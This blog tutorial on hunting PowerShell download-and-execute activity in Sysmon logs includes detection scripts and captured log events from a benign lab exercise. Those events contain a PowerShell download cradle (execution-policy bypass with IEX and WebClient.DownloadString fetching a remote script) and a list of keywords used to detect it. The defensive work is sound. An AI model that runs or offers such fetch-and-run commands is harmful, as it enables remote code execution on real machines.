---
title: "Threat Hunting with sysmon 101 part 3: Command line investigation"
date: 2024-02-21 11:40:00 +0200
categories: Threat_hunting
description: Threat hunting with sysmon 
tags: Threat hunting sysmon Threat-hunting windows logs ELK
published: true
---

In this article, we'll look at Mitre technique T1059.001 [Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/). We will download and execute a batch file [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), and we will look at sysmon logs to see the articats created from such activity.

# Overview of T1059.001
T1059.001 is categorized under the Execution tactic in the MITRE ATT&CK framework. It involves the use of command-line interfaces (CLIs) or scripting interpreters to execute commands or scripts, which can be leveraged by adversaries for various purposes, including lateral movement, privilege escalation, and data exfiltration. Common command-line interfaces and scripting interpreters utilized by adversaries include PowerShell, Command Prompt (cmd.exe), Bash, Python, and others.

# Execution 
The exercise file can be downloaded from [here](https://github.com/11x256/11x256.github.io/blob/test/assets/exercise/th3/1.bat). its a simple batch script that will download a powershell script from github. This powershell script will run notepad.exe if it gets downloaded and executed successfully.

# Hunting Queries
So, to find such technique in sysmon logs, we can try a few different things:
- Identify newly downloaded files, and search for any process creation events that involves any one of those files
  - We cannot run this query right now, as sysmon is not logging filewrites by default.
- Search for executed files that are stored in the downloads folder
  - Assuming that attackers will not move the downloaded file to another location
- Search for powershell process with url patterns in the command line
- Search for process where the parent process is web browser
  - This behaviour will exist if the attacker download and executed the file from within the browser
  

## Query 1: Files executed from within the downloads folder
To search for events matching this rule, we will use powershell to filter sysmon events. In order to do that, we can use the **CommandLine** field in sysmon process creation event as follows. Make sure to run in powershell with admin rights.

```
$logs= Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1}

foreach ($log in $logs){
    $conditions_matched = 0
    foreach($line in ($log.message -split '\n'))
    {

        if (($line.StartsWith("CommandLine")) -and ($line -match ".*\\downloads\\.*" ) ){
            $conditions_matched +=1
        }
    }
    if ($conditions_matched -eq 1 ){
        echo $log.Message
        echo "***************************************************"}
}
```
This command prints this output on my device, i added these arrows manually, its not part of the output of the script.
```
Process Create:
RuleName: -
UtcTime: 2024-03-05 00:35:34.450
ProcessGuid: {e3b07ee5-68d6-65e6-3702-000000000800}
ProcessId: 5292
Image: C:\Windows\System32\cmd.exe                                                            <<<<<<<<<<<<<< 
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /c ""C:\Users\abdo-pc\Downloads\1.bat" "              <<<<<<<<<<<<<<
CurrentDirectory: C:\Users\abdo-pc\Downloads\
User: DESKTOP-D3OJRQ4\abdo-pc
LogonGuid: {e3b07ee5-674d-65e6-52f1-100000000000}
LogonId: 0x10F152
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59
ParentProcessGuid: {e3b07ee5-68c0-65e6-1902-000000000800}
ParentProcessId: 9320
ParentImage: C:\Program Files\Google\Chrome\Application\chrome.exe                              <<<<<<<<<<<<<<
ParentCommandLine: "C:\Program Files\Google\Chrome\Application\chrome.exe" 
ParentUser: DESKTOP-D3OJRQ4\abdo-pc
***************************************************
```
As shown in the output above, **ParentImage** chrome.exe executed cmd.exe in order to run 1.bat file, which is stored in the downloads folder. Also, we can see that the process **Image** (cmd.exe) is not stored in the downloads folder, its the script that is getting execute that is stored in the downloads folder.

## Query 2: Search for powershell processes with urls in command line
The script for this hunt will use the same fields from the previous hunt. We will search for powershell.exe process with the word "http" in the command line.
```
$logs= Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1}

foreach ($log in $logs){
    $conditions_matched = 0
    foreach($line in ($log.message -split '\n'))
    {
        if (($line.StartsWith("Image")) -and ($line -match ".*powershell.exe.*" ) ){
            $conditions_matched +=1
        }
        if (($line.StartsWith("CommandLine")) -and ($line -match ".*http.*" ) ){
            $conditions_matched +=1
        }
    }
    if ($conditions_matched -eq 2 ){
        echo $log.Message
        echo "***************************************************"}
}

```
Output would look like this:
```
Process Create:
RuleName: -
UtcTime: 2024-03-05 00:36:25.625
ProcessGuid: {e3b07ee5-6909-65e6-5602-000000000800}
ProcessId: 3900
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                          <<<<<<<<<<<<<<
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -noexit -ep bypass -command IEX((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/11x256/11x256.github.io/                                                               
test/assets/exercise/th3/1.ps1'))
CurrentDirectory: C:\Users\abdo-pc\Downloads\
User: DESKTOP-D3OJRQ4\abdo-pc
LogonGuid: {e3b07ee5-674d-65e6-52f1-100000000000}
LogonId: 0x10F152
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3
ParentProcessGuid: {e3b07ee5-6909-65e6-5402-000000000800}
ParentProcessId: 4264
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /c ""C:\Users\abdo-pc\Downloads\1.bat" "     <<<<<<<<<<<<<<
ParentUser: DESKTOP-D3OJRQ4\abdo-pc
***************************************************
```
The output indeeds looks very suspicious, we can see a url pointing to  a .ps1 file hosted on github, we can also see some suspicious keywords like:
- bypass
- IEX
- WebClient
- DownloadString

All of these keywords are required for the attack to be successful and the are very commonly used to identify this type of attack. As can be seen [here](https://github.com/search?q=repo%3AAzure%2FAzure-Sentinel%20IEX&type=code) in azure sentinel repo of threat hunting rules.

## Query 3: Search for powershell processes with urls in command line
For this one we will use **ParentImage** and **CommandLine** fields as follows:
```
$logs= Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1}

foreach ($log in $logs){
    $conditions_matched = 0
    foreach($line in ($log.message -split '\n'))
    {
        if (($line.StartsWith("ParentImage")) -and ($line -match ".*chrome.exe" ) ){
            $conditions_matched +=1
        }

    }
    if ($conditions_matched -eq 1 ){
        echo $log.Message
        echo "***************************************************"}
}
```
This one will produce some false positives, as usually browsers create many processes to check for updates and distribute workload. But, still a good way to collect potentially sucpicious processes.
```
Process Create:
RuleName: -
UtcTime: 2024-03-05 00:36:25.250
ProcessGuid: {e3b07ee5-6909-65e6-5402-000000000800}
ProcessId: 4264
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /c ""C:\Users\abdo-pc\Downloads\1.bat" "
CurrentDirectory: C:\Users\abdo-pc\Downloads\
User: DESKTOP-D3OJRQ4\abdo-pc
LogonGuid: {e3b07ee5-674d-65e6-52f1-100000000000}
LogonId: 0x10F152
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59
ParentProcessGuid: {e3b07ee5-68c0-65e6-1902-000000000800}
ParentProcessId: 9320
ParentImage: C:\Program Files\Google\Chrome\Application\chrome.exe
ParentCommandLine: "C:\Program Files\Google\Chrome\Application\chrome.exe" 
ParentUser: DESKTOP-D3OJRQ4\abdo-pc
***************************************************
```

Handling False positives is a regular task in threat hunting, for example, we can fine tune this rule by filtering for extra fields to reduce FPs, like removing entries where both the parent and the child is chrome.exe.

# Extra Task:
Lets also check the behaviour of the .ps1 file that got download from github. We can do that by finding all processes created where the parent is the powershell process that executed that .ps1 file.
```
$logs= Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1}

foreach ($log in $logs){
    $conditions_matched = 0
    foreach($line in ($log.message -split '\n'))
    {

        if (($line.StartsWith("ParentCommandLine")) -and ($line -match ".*ps1" ) ){
            $conditions_matched +=1
        }
    }
    if ($conditions_matched -eq 1 ){
        echo $log.Message
        echo "***************************************************"}
}

```
Output:
```
Process Create:
RuleName: -
UtcTime: 2024-03-05 00:36:29.969
ProcessGuid: {e3b07ee5-690d-65e6-5a02-000000000800}
ProcessId: 1824
Image: C:\Windows\System32\notepad.exe                          <<<<<<<<<<
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Notepad
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: NOTEPAD.EXE
CommandLine: "C:\Windows\system32\notepad.exe"                  <<<<<<<<<<
CurrentDirectory: C:\Users\abdo-pc\Downloads\
User: DESKTOP-D3OJRQ4\abdo-pc
LogonGuid: {e3b07ee5-674d-65e6-52f1-100000000000}
LogonId: 0x10F152
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=CB448EA83BCF46A21AA9A9B258F39C85DF962B18AE3682F2AAAC9D79E2C04EBD
ParentProcessGuid: {e3b07ee5-6909-65e6-5602-000000000800}
ParentProcessId: 3900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe  -noexit -ep bypass -command IEX((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/11x256/11x256.gith
ub.io/test/assets/exercise/th3/1.ps1'))
ParentUser: DESKTOP-D3OJRQ4\abdo-pc
***************************************************
```